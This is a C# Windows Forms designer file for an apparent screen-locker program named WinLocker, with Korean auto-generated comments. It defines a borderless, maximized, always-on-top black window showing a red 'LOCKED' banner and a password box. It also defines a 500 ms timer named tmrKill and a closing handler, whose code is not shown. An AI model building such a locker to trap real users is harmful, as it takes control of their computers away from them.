namespace WinLocker
{
    partial class FrmLock
    {
        /// <summary>
        /// 필수 디자이너 변수입니다.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// 사용 중인 모든 리소스를 정리합니다.
        /// </summary>
        /// <param name="disposing">관리되는 리소스를 삭제해야 하면 true이고, 그렇지 않으면 false입니다.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form 디자이너에서 생성한 코드

        /// <summary>
        /// 디자이너 지원에 필요한 메서드입니다. 
        /// 이 메서드의 내용을 코드 편집기로 수정하지 마세요.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.txtPW = new System.Windows.Forms.TextBox();
            this.lblLocked = new System.Windows.Forms.Label();
            this.tmrKill = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // txtPW
            // 
            this.txtPW.Font = new System.Drawing.Font("굴림", 20F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(129)));
            this.txtPW.Location = new System.Drawing.Point(659, 577);
            this.txtPW.Name = "txtPW";
            this.txtPW.PasswordChar = '*';
            this.txtPW.Size = new System.Drawing.Size(405, 53);
            this.txtPW.TabIndex = 0;
            this.txtPW.TextChanged += new System.EventHandler(this.TxtPW_TextChanged);
            // 
            // lblLocked
            // 
            this.lblLocked.AutoSize = true;
            this.lblLocked.Font = new System.Drawing.Font("Forte", 222F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblLocked.ForeColor = System.Drawing.Color.Red;
            this.lblLocked.Location = new System.Drawing.Point(411, 711);
            this.lblLocked.Name = "lblLocked";
            this.lblLocked.Size = new System.Drawing.Size(1815, 486);
            this.lblLocked.TabIndex = 1;
            this.lblLocked.Text = "LOCKED";
            // 
            // tmrKill
            // 
            this.tmrKill.Enabled = true;
            this.tmrKill.Interval = 500;
            this.tmrKill.Tick += new System.EventHandler(this.TmrKill_Tick);
            // 
            // FrmLock
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(10F, 18F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(2544, 1429);
            this.Controls.Add(this.lblLocked);
            this.Controls.Add(this.txtPW);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "FrmLock";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            this.TopMost = true;
            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmLock_FormClosing);
            this.Load += new System.EventHandler(this.FrmLock_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox txtPW;
        private System.Windows.Forms.Label lblLocked;
        private System.Windows.Forms.Timer tmrKill;
    }
}

